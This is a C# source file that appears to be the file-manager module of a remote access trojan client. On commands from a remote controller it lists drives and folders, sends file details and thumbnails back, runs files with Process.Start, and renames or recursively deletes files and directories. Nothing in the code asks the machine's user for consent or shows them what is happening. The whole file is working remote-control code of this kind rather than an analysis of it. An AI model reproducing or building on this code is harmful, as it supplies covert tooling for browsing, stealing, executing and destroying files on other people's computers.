using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Client.Connection;
using Client.Things;
using Stuff;

namespace Client.Handlers
{
    internal class managerHandler
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        };

        public static class FILE_ATTRIBUTE
        {
            public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        }

        public static class SHGFI
        {
            public const uint SHGFI_TYPENAME = 0x000000400;
            public const uint SHGFI_USEFILEATTRIBUTES = 0x000000010;
        }

        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);

        public managerHandler(Unpack unpack)
        {
            try
            {
                switch (unpack.GetAsString("Action"))
                {
                    case "Drives":
                        {
                            GetDrives();
                            break;
                        }
                    case "Open":
                        {
                            string target = unpack.GetAsString("Target");
                            if (string.IsNullOrEmpty(target)) return;
                            if (!Directory.Exists(target) && !File.Exists(target)) return;
                            Process.Start(target);
                            break;
                        }
                    case "Rename":
                        {

                            string old = unpack.GetAsString("Old");
                            string neww = unpack.GetAsString("New");
                            bool Folder = unpack.GetAsBoolen("Folder");
                            if (Folder)
                            {
                                Directory.Move(old, neww);
                            }
                            else
                            {
                                File.Move(old, neww);
                            }

                            break;
                        }
                    case "NewFolder":
                        {
                            string target = unpack.GetAsString("Target");
                            Directory.CreateDirectory(target);
                            break;
                        }
                    case "Goto":
                        {
                            gotodir(unpack.GetAsString("Path"));
                            break;
                        }
                    case "Delete":
                        {

                            string target = unpack.GetAsString("Target");
                            bool Folder = unpack.GetAsBoolen("Folder");
                            if (Folder)
                            {
                                Directory.Delete(target, true);
                            }
                            else
                            {
                                File.Delete(target);
                            }

                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Pack pack = new Pack();
                pack.Set("Packet", "Error");
                pack.Set("Error", ex.Message);
                SillyClient.Send(pack.Pacc());
                return;
            }
        }
        private SHFILEINFO GetSHFILEINFO(string filePath)
        {
            SHFILEINFO info = new SHFILEINFO();
            uint dwFileAttributes = FILE_ATTRIBUTE.FILE_ATTRIBUTE_NORMAL;
            uint uFlags = (uint)(SHGFI.SHGFI_TYPENAME | SHGFI.SHGFI_USEFILEATTRIBUTES);
            SHGetFileInfo(Path.GetFullPath(filePath), dwFileAttributes, ref info, (uint)Marshal.SizeOf(info), uFlags);
            return info;
        }
        private Bitmap GetIcon(string file)
        {
            try
            {
                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") || file.EndsWith("bmp"))
                {
                    using (Bitmap myBitmap = new Bitmap(file))
                    {
                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
                    }
                }
                else
                    using (Icon icon = Icon.ExtractAssociatedIcon(file))
                    {
                        return icon.ToBitmap();
                    }
            }
            catch
            {
                return new Bitmap(48, 48);
            }
        }
        public void GetDrives()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            StringBuilder sbDriver = new StringBuilder();
            Pack pack = new Pack();
            pack.Set("Packet", "Manager");
            pack.Set("UID", UID.Get());
            pack.Set("Action", "Drives");
            foreach (DriveInfo drive in allDrives)
            {
                if (drive.IsReady)
                {
                    pack.Set(drive.Name, string.Empty);
                }
            }
            SillyClient.Send(pack.Pacc());
        }
        public void gotodir(string dir)
        {
            if (!Directory.Exists(dir))
            {
                Pack miau = new Pack();
                miau.Set("Packet", "Manager");
                miau.Set("UID", UID.Get());
                miau.Set("Action", "Goto");
                SillyClient.Send(miau.Pacc());
                return;
            }

            StringBuilder sbFolder = new StringBuilder();
            StringBuilder sbFile = new StringBuilder();

            Pack pack = new Pack();
            pack.Set("Packet", "Manager");
            pack.Set("UID", UID.Get());
            pack.Set("Action", "Goto");
            pack.Set("CurrentPath", dir);

            foreach (string folder in Directory.GetDirectories(dir))
            {
                sbFolder.Append(Path.GetFileName(folder) + "-=>" + new DirectoryInfo(folder).LastWriteTime + "-=>" + Path.GetFullPath(folder) + "-=>");
            }
            pack.Set("Folders", sbFolder.ToString());

            foreach (string file in Directory.GetFiles(dir))
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    GetIcon(file.ToLower()).Save(ms, ImageFormat.Png);
                    sbFile.Append(Path.GetFileName(file) + "-=>" + new FileInfo(file).LastWriteTime + "-=>" + getSHFILEINFO(file).szTypeName + "-=>" + Helpers.BytesToString(new FileInfo(file).Length) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
                }
            }
            pack.Set("Files", sbFile.ToString());
            SillyClient.Send(pack.Pacc());
        }
        private SHFILEINFO getSHFILEINFO(string filePath)
        {
            SHFILEINFO info = new SHFILEINFO();
            uint dwFileAttributes = FILE_ATTRIBUTE.FILE_ATTRIBUTE_NORMAL;
            uint uFlags = (uint)(SHGFI.SHGFI_TYPENAME | SHGFI.SHGFI_USEFILEATTRIBUTES);
            SHGetFileInfo(Path.GetFullPath(filePath), dwFileAttributes, ref info, (uint)Marshal.SizeOf(info), uFlags);
            return info;
        }

    }
    class DirectoryCopy
    {
        public static void DirCopy(string source, string destination, int taskCount = 2)
        {
            dirCollection = new List<string>();
            SemaphoreSlim semaphoreSlim = new SemaphoreSlim(taskCount);
            List<Task> tasks = new List<Task>();
            RetriveDirs(source);
            foreach (string dir in dirCollection)
            {
                string NewPath = Path.Combine(destination, ParseDir(dir, source, destination));
                if (Directory.Exists(NewPath)) continue;
                Directory.CreateDirectory(NewPath);
                foreach (string file in Directory.GetFiles(dir))
                {
                    tasks.Add(Task.Run(() =>
                    {
                        semaphoreSlim.Wait();
                        string NewFilePath = Path.Combine(NewPath, Path.GetFileName(file));
                        File.Copy(file, NewFilePath, true);
                        semaphoreSlim.Release();
                    }));
                }
            }
            Task.WaitAll(tasks.ToArray());
        }
        static string ParseDir(string value, string oldValue, string newValue)
        {
            if (value.StartsWith(oldValue))
            {
                oldValue = oldValue.Remove(oldValue.LastIndexOfAny(new char[] { '\\' }, oldValue.LastIndexOf('\\')));
                value = value.Remove(0, oldValue.Length);
                value = newValue + value;
            }
            return value;
        }
        static List<string> dirCollection { get; set; }
        static void RetriveDirs(string dir)
        {
            try
            {
                dirCollection.Add(dir);
                string[] dirs = Directory.GetDirectories(dir);
                if (!(dirs.Length > 0)) return;
                foreach (string sdir in dirs)
                {
                    RetriveDirs(sdir);
                }
            }
            catch
            {
            }
        }
    }
}
